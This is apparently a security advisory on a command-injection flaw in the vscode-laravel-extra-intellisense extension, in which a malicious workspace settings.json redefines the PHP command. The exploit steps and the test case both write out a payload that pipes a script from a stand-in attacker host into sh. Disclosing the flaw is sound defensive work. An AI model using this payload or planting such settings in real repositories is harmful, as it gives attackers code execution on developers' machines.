# Valid Vulnerabilities in `vscode-laravel-extra-intellisense`

## Remote Command Injection via PHP Command Configuration

**Description:**
The extension allows users to define their own command to execute PHP code through the configuration setting `LaravelExtraIntellisense.phpCommand`. This command executes user-supplied PHP code directly and can run via `docker exec` or `docker-compose exec`. A threat actor could exploit this vulnerability by convincing the victim to clone and open a specially crafted malicious Laravel repository within VSCode. The manipulated VSCode configuration (`settings.json`) would redefine the `LaravelExtraIntellisense.phpCommand` setting to include malicious commands that VSCode will automatically execute via the extension. Specifically:

1. The attacker creates a Laravel repository containing a `.vscode/settings.json` file.
2. They configure the malicious Laravel repository with:
```json
"LaravelExtraIntellisense.phpCommand": "php -r \"{code}\"; curl http://attacker.com/shell.sh | sh"
```
3. The victim clones the crafted repository and opens it in VSCode. VSCode automatically loads workspace configurations.
4. The extension periodically invokes the configured PHP command automatically, thus executing the malicious code injection silently on the victim's machine.

**Impact:**
Remote Command Execution (RCE) can be executed without explicit user action, granting attackers unrestricted access to execute arbitrary commands on victim machines. This leads to potential complete host compromise, installation of malware, theft or modification of user data, and privilege escalation or lateral movement within the victim's network.

**Vulnerability Rank:** Critical

**Currently Implemented Mitigations:**
No explicit mitigations exist in the project’s current codebase.

**Missing Mitigations:**
- Secure validation and sanitization of user-configurable commands to explicitly permit only authorized and safe PHP execution commands.
- Implementation of a defined allowed list or restricted execution environment limiting the scope of user-defined execution commands from external workspace.
- User confirmation prompts or explicit trust verification before loading and executing extensions configuration from externally fetched workspace settings automatically.

**Preconditions:**
- The victim must have VSCode along with this extension installed and active.
- The victim must clone or open a maliciously crafted repository that contains harmful extension settings within `.vscode/settings.json`.

**Source Code Analysis:**
- The vulnerability originates from the way the extension fetches and directly executes the user-defined configuration from `settings.json`.
- Located in `helpers.ts`, the method calling arbitrary command execution is as follows:
  ```ts
  let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
  let command = commandTemplate.replace("{code}", code);
  cp.exec(command, {...});
  ```
- Here, the extension directly fetches the workspace configuration setting (`phpCommand`) with no checks or sanitization routines being performed. As a result, arbitrary commands appended by attackers through `.vscode/settings.json` will directly execute via a system command execution (`cp.exec`), significantly impacting security.

**Security Test Case:**
1. Set up a malicious git repository named `malicious-laravel-project`.
2. Include a file `.vscode/settings.json` containing:
```json
{
  "LaravelExtraIntellisense.phpCommand": "php -r \"{code}\"; curl http://attacker.com/malicious.sh | sh"
}
```
3. Place an `artisan` file at repository root so that the extension recognizes it as a Laravel project.
4. Victim clones and opens this repository in VSCode having the `vscode-laravel-extra-intellisense` extension installed and active.
5. Once opened, VSCode automatically loads the affected `.vscode/settings.json` configurations.
6. The extension will trigger its periodic internal data-loading process, invoking the configured PHP command explicitly. This leads to automatic execution of the injected malicious commands remotely set by the attacker.
7. Confirm the attacker’s server logs confirm reception of the victim’s request: the malicious shell script execution has initiated on the victim’s machine.

This verifies the critical RCE vulnerability, as the exploit does not require explicit user input once the repository is opened in VSCode.
